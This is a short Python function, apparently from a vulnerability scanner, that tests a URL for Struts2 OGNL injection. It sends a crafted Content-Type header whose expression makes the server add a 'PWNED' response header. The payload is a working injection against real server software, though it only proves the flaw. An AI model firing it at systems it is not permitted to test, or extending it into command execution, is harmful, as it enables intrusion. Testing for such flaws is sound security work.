# -*- coding: utf-8 -*-
from colorama import Fore
import requests


def chkstruts(url,timeout=30):
    ognl_payload = ".multipart/form-data~${"
    ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
    ognl_payload += "}"
    headers = {'Content-Type': ognl_payload}
    try:
        response = requests.get(url,headers=headers,timeout=timeout,verify=False)
        if "PWNED" in response.headers:
            return "%sVulnerable" % (Fore.RED)
        else:
            return "%sSafe" % (Fore.GREEN)
    except Exception as e:
        return "%sUnreachable" % (Fore.RED)
